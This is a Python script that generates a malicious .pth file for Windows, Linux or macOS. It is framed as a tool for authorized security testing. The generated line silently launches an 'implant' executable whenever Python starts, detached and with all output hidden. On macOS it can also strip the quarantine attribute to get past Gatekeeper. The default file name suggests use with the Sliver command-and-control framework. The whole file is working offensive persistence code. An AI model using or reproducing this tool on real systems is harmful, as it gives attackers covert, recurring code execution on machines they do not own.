#!/usr/bin/env python3
"""Generate a Python ``.pth`` file for authorized security testing.

The generated file starts an existing executable when Python processes the
target site-packages directory. It does not copy, download, or install that
executable.
"""

from __future__ import annotations

import argparse
import ntpath
import posixpath
import sys
from pathlib import Path


SUPPORTED_TARGETS = ("windows", "linux", "macos")


def _quote_py(value: str) -> str:
    """Return a Python string literal suitable for a generated line."""
    return repr(value)


def build_windows_line(path: str) -> str:
    """Build a one-line ``.pth`` payload for Windows."""
    executable = _quote_py(path)
    return (
        "import subprocess;"
        f"subprocess.Popen([{executable}],close_fds=True,"
        "creationflags=0x00000008|0x00000200,"
        "stdin=subprocess.DEVNULL,stdout=subprocess.DEVNULL,"
        "stderr=subprocess.DEVNULL)"
    )


def build_posix_line(path: str) -> str:
    """Build a one-line ``.pth`` payload for Linux."""
    executable = _quote_py(path)
    return (
        "import subprocess;"
        f"subprocess.Popen([{executable}],close_fds=True,start_new_session=True,"
        "stdin=subprocess.DEVNULL,stdout=subprocess.DEVNULL,"
        "stderr=subprocess.DEVNULL)"
    )


def build_macos_line(path: str, remove_quarantine: bool = False) -> str:
    """Build a one-line ``.pth`` payload for macOS.

    Quarantine removal is deliberately opt-in. Argument lists are used instead
    of shell strings so paths containing quotes or metacharacters stay data.
    """
    executable = _quote_py(path)
    setup = f"_p={executable};os.chmod(_p,os.stat(_p).st_mode|0o111);"
    if remove_quarantine:
        setup += (
            "subprocess.run(['/usr/bin/xattr','-d','com.apple.quarantine',_p],"
            "stdin=subprocess.DEVNULL,stdout=subprocess.DEVNULL,"
            "stderr=subprocess.DEVNULL,check=False);"
        )
    return (
        "import os,subprocess;"
        f"{setup}"
        "subprocess.Popen([_p],close_fds=True,start_new_session=True,"
        "stdin=subprocess.DEVNULL,stdout=subprocess.DEVNULL,"
        "stderr=subprocess.DEVNULL)"
    )


def _validate_target_path(path: str, os_target: str) -> None:
    """Require a target-native absolute path."""
    if os_target == "windows":
        drive, _ = ntpath.splitdrive(path)
        # A leading slash is rooted on the current drive in Windows, but that
        # drive is unknowable when generating elsewhere. Require drive or UNC.
        is_absolute = bool(drive) and ntpath.isabs(path)
    else:
        is_absolute = posixpath.isabs(path)
    if not is_absolute:
        raise ValueError(
            f"implant path must be absolute using {os_target} path syntax: {path!r}"
        )


def generate(
    implant_path: str,
    os_target: str,
    output: str,
    *,
    quiet: bool = False,
    force: bool = False,
    remove_quarantine: bool = False,
) -> str:
    """Generate a ``.pth`` file and return its executable line."""
    os_target = os_target.lower()
    if os_target not in SUPPORTED_TARGETS:
        raise ValueError(f"unsupported OS target: {os_target}")

    _validate_target_path(implant_path, os_target)

    output_path = Path(output)
    if output_path.exists() and not force:
        raise FileExistsError(f"output already exists (use --force): {output_path}")
    if output_path.parent != Path(".") and not output_path.parent.exists():
        raise FileNotFoundError(f"output directory does not exist: {output_path.parent}")

    if os_target == "windows":
        line = build_windows_line(implant_path)
    elif os_target == "macos":
        line = build_macos_line(implant_path, remove_quarantine=remove_quarantine)
    else:
        line = build_posix_line(implant_path)

    compile(line, str(output_path), "exec")
    output_path.write_text(line + "\n", encoding="utf-8")

    if not quiet:
        print(f"[+] wrote {output_path}")
        print(f"    target OS    : {os_target}")
        print(f"    implant path : {implant_path}")
        print(f"    size         : {output_path.stat().st_size} bytes")
        if remove_quarantine:
            print("    quarantine   : removal embedded (runs on macOS at startup)")

    return line


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        description=(
            "Generate a .pth file that launches an existing executable for "
            "authorized security testing"
        )
    )
    parser.add_argument(
        "implant_path",
        help="Absolute path where the executable will exist on the target",
    )
    parser.add_argument(
        "--os",
        choices=[*SUPPORTED_TARGETS, "darwin"],
        default="linux",
        help="Target OS (default: linux; darwin is an alias for macos)",
    )
    parser.add_argument(
        "-o",
        "--output",
        default="picklesliver.pth",
        help="Output filename (default: picklesliver.pth)",
    )
    parser.add_argument(
        "--remove-quarantine",
        action="store_true",
        help=(
            "Embed macOS quarantine removal; it runs on the target immediately "
            "before launch"
        ),
    )
    parser.add_argument(
        "--force",
        action="store_true",
        help="Overwrite an existing output file",
    )
    parser.add_argument(
        "--quiet",
        "-q",
        action="store_true",
        help="Suppress informational output",
    )
    return parser


def main(argv: list[str] | None = None) -> int:
    args = build_parser().parse_args(argv)
    os_target = "macos" if args.os == "darwin" else args.os

    if args.remove_quarantine and os_target != "macos":
        print("[-] --remove-quarantine is only valid for a macOS target", file=sys.stderr)
        return 2

    try:
        generate(
            args.implant_path,
            os_target,
            args.output,
            quiet=args.quiet,
            force=args.force,
            remove_quarantine=args.remove_quarantine,
        )
    except (FileExistsError, FileNotFoundError, OSError, ValueError) as error:
        print(f"[-] {error}", file=sys.stderr)
        return 1

    return 0


if __name__ == "__main__":
    sys.exit(main())
